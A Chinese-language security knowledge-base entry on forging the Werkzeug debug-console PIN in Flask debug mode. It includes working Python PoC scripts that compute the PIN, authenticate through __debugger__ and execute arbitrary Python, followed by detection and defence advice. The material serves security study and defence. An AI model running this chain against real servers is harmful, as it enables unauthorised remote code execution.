---
id: web-python-framework-flask-werkzeug-debug-pin-forgery
title: Flask 调试模式 Werkzeug 控制台 PIN 可预测伪造导致任意代码执行
type: scenario
domain: web
path: web/python/framework
technique: werkzeug-debug-pin-forgery
tags:
- flask
- werkzeug
- debug-mode
- pin
- rce
- python
- console
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V15
  verified_at: '2026-11-05T01:53:03+08:00'
  notes: 已对照原文与图03-08核对：图03 实测 public_bits ['Administrator','random_string','Flask',None]、private_bits ['345043716183', b'1dc7ed7e-cea1-4830-a721-f5a469c1a74f']；图04/05 500 页与 PIN 110-895-084；图06 print(1) 执行；图07 arp -a 取 MAC 00-50-56-35-48-57；图08 弹计算器。Werkzeug 3.1.3 为题目环境版本而非受影响区间，未设 versions。PoC 未在本机执行；frontmatter 无 sources/source_url。
url: /docs/web/python/framework/web-python-framework-flask-werkzeug-debug-pin-forgery/
draft: false
kb_aliases:
- Flask PIN 破解
- Werkzeug 调试控制台 PIN
- Flask debug console RCE
- public_bits private_bits
- __debugger__ pinauth
---

## 一句话结论

Flask 以 `debug=True` 暴露 Werkzeug 调试控制台时，控制台 PIN 由公开的环境常量（用户名、模块名、应用类名、模块路径）和可获取的机器标识（MAC 派生值、machine-id）确定性推导；攻击者收集这些 bits 后可在本地算出 PIN，通过 `__debugger__` 接口认证并执行任意 Python 代码。

## 原理

- Werkzeug 调试控制台的 PIN 不是随机密钥，而是哈希派生值：
  ```python
  probably_public_bits = [username, modname, app.__name__, mod.__file__]
  private_bits = [str(uuid.getnode()), get_machine_id()]
  ```
- `get_pin_and_cookie_name()` 用 `sha1` 依次更新 public/private bits，再混入固定盐 `cookiesalt`、`pinsalt`，取十六进制前 9 位按 3/4/5 分组得到 `xxx-xxx-xxx` 形式 PIN。算法在客户端可完整复现。
- 这些 bits 大多不是秘密：用户名常见（`Administrator`、`root`、`www-data`）；`modname` 可由源码泄露、错误页或文件读取获得；应用类名通常是 `Flask`；模块文件路径可为 `None` 或已知路径。
- `uuid.getnode()` 默认取网卡 MAC 并转成整数；同一二层网络内可用 ARP 表直接读到靶机 MAC。Windows 的 `get_machine_id()` 读注册表 `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`，Linux 读 `/etc/machine-id`，虚拟化/批量部署环境中往往固定或可预测。
- 触发一个未捕获异常后，500 调试页会返回 `SECRET` 和 `frame-<n>`；凭这两个值加 PIN 即可通过 `pinauth`，随后 `cmd` 参数就是任意 Python 执行。原文在 Werkzeug 3.1.3 上实测成功。

## 触发条件

- Flask 应用以 debug 模式运行（`app.run(debug=True)` 或等价配置），且调试器可从攻击者网络访问。
- 能制造未处理异常以打开调试页（如调用不存在的子进程、畸形参数）。
- 能获得 public bits：用户名、`app.__module__`、应用类名、模块路径。
- 能获得 private bits：靶机 MAC（同网段 ARP）与 machine-id（Windows 注册表 / Linux 文件；或通过文件读取漏洞获得）。

## 利用步骤

1. 确认调试模式：访问任意路径制造 500，观察是否出现 Werkzeug traceback 与 Console Locked/PIN 输入框。
2. 收集 public bits：从源码泄露或文件读取拿到 `app.__module__`；用户名按部署环境猜测；应用类名通常为 `Flask`；`__main__` 运行时模块路径为 `None`。
3. 收集 private bits：同网段执行 `arp -a` 取靶机 MAC，转为整数；获取 machine-id（Windows `MachineGuid`，Linux `/etc/machine-id`）。
4. 本地用与 Werkzeug 相同的 `generate_pin()` 计算 PIN。
5. 触发未处理异常，从 500 页面提取 `SECRET` 和 `frame-<n>`。
6. 请求 `?__debugger__=yes&cmd=pinauth&s=<SECRET>&pin=<PIN>` 完成认证；再带 `frm`、`s`、`pin` 和 `cmd=<python>` 执行代码。

## PoC

PIN 计算（与 Werkzeug 3.1.3 的派生逻辑一致）：

```python
import hashlib
from itertools import chain

def generate_pin(public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode()
        h.update(bit)
    h.update(b"cookiesalt")
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    for size in (5, 4, 3):
        if len(num) % size == 0:
            return "-".join(num[i:i+size].rjust(size, "0") for i in range(0, len(num), size))
    return num

public_bits = ["Administrator", "random_string", "Flask", None]
private_bits = [
    str(int("00-50-56-35-48-57".replace("-", ""), 16)),  # 靶机 MAC
    "1dc7ed7e-cea1-4830-a721-f5a469c1a74f",              # Windows MachineGuid
]
print(generate_pin(public_bits, private_bits))  # 例如 110-895-084
```

认证并执行命令：

```python
import re, requests

s = requests.Session()
base = "http://target"

# 1) 制造未处理异常，取 SECRET 与 frame
r = s.post(base + "/api/abnf/parse")
assert r.status_code == 500
frm = re.search(r'<div class="frame" id="frame-(\d+)">', r.text).group(1)
sec = re.search(r'\s+SECRET = "([^"]+)";', r.text).group(1)

# 2) pinauth
r = s.get(base + "/api/abnf/parse",
          params={"__debugger__": "yes", "cmd": "pinauth", "s": sec, "pin": pin})
assert r.status_code == 200

# 3) 执行任意 Python
r = s.get(base + "/api/abnf/parse",
          params={"__debugger__": "yes", "cmd": 'import os;os.system("calc")',
                  "frm": frm, "s": sec, "pin": pin})
print(r.text)
```

原文在虚拟机内用该方法拿到 PIN `110-895-084`，调试控制台成功执行 `print(1)` 并弹出计算器。

## 变体与关联

- 变体：`modname` 未知时，先通过任意文件读取（如文档转换器的包含指令）读 `run.py`，取得 `app.__module__` 后再计算 PIN。
- 变体：台上靶机 MAC 与搭建环境不同时，同网段 `arp -a` 读取真实 MAC 即可；machine-id 在克隆虚拟机中常保持不变。
- 变体：Linux 下 private bits 使用 `/etc/machine-id` 与网卡 MAC；容器内 machine-id 可能来自镜像或 cgroup，需按实际环境取。
- 关联：[[web-generic-file-inclusion-mmark-include-directive-file-read]] 可作为 public bits 的泄露入口。
- 边界：生产环境关闭 debug、调试器仅监听 localhost、或通过反向代理阻断 `__debugger__` 参数时，本手法不可达；PIN 算法随 Werkzeug 版本可能变化，需以目标版本代码为准。

## 检测与防御

- 检测：请求中出现 `__debugger__=yes`、`cmd=pinauth`、`frm=`、`pin=` 参数；500 响应包含 Werkzeug traceback 或 Console Locked 页面；短时间内大量触发 500 后出现调试接口访问。
- 检测：应用进程启动参数含 `debug=True`；生产环境 Flask 响应泄露 traceback。
- 防御：生产环境绝不开启 debug；使用 WSGI 服务器（gunicorn/uwsgi）并显式 `debug=False`；调试器只绑定 127.0.0.1；通过 `WERKZEUG_DEBUG_PIN` 设置随机值并限制访问来源。
- 加固：不向客户端返回详细异常；限制应用对 machine-id、MAC 等环境信息的可读性只能降低可预测性，不能替代关闭调试器；将应用运行在隔离容器中，缩小代码执行后的影响面。
